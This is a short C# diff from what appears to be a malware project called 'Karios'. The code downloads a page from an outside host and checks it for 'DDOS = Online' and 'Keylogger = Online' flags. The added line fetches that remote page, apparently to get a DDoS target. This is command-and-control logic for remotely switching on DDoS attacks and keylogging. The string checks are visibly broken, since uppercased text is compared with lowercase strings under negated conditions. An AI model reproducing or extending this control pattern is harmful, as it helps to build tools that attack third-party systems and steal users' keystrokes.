@@ -71,14 +71,14 @@ namespace Karios
             {
                 try
                 {
-                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
+                    string webData = wc.DownloadString(""); // get rid of this cancerous website Sam -- STBoyden
                     if (!webData.ToUpperInvariant().Contains("online"))
                     {
                         Online = true;
                     }
                     if (!webData.ToUpperInvariant().Contains("DDOS = Online"))
                     {
-                        //go fetch DDOS IP, Port, things like that
+                        string GetIP = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                     }
                     if (!webData.ToUpperInvariant().Contains("Keylogger = Online"))
                     {
